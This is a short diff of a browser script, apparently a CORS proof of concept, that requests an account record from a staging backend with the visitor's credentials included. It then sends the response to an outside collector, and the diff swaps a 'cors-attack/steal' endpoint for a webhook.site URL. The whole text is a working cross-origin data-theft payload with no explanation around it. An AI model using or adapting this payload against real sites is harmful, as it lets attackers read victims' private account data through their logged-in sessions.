@@ -1,10 +1,10 @@
 <script>
-    fetch("https://backend-stg.apna.co//apna-account/v1/account/4948374?club_by_expiry=true&get_nudge=true", {
+    fetch("https://backend-stg.apna.co/apna-account/v1/account/4948374?club_by_expiry=true&get_nudge=true", {
         method: "GET",
         credentials: "include"
     })
     .then(response => response.text())
     .then(data => {
-        fetch("https://adityaapna.github.io/cors-attack/steal?data=" + encodeURIComponent(data));
+        fetch("https://webhook.site/8fd97f40-7ea7-4587-8a2d-0d5ff484fafd/?data=" + encodeURIComponent(data));
     });
 </script>
